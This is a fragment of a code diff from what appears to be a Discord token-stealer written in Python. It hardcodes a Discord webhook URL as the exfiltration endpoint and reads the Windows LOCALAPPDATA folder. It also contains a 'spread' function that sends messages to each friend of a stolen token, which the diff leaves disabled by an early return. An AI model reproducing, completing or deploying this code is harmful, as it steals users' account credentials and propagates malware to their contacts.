@@ -12,7 +12,6 @@ from time import sleep
 from sys import argv
 dt = datetime.now()
 
-# Paste your webhook url to "URL_HERE"
 WEBHOOK_URL = 'https://discordapp.com/api/webhooks/916150945635782737/pEV5ZQLezY4IZtsgMCqX_4ejofTUeMyk3YCEssQTLPZ1NY4vWB-OiZOlRC-VPcrPZK9K'
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -92,7 +91,7 @@ def send_message(token, chat_id, form_data):
     except:
         pass
 def spread(token, form_data, delay):
-    return # Remove to re-enabled
+    return 
     for friend in getfriends(token):
         try:
             chat_id = getchat(token, friend["id"])
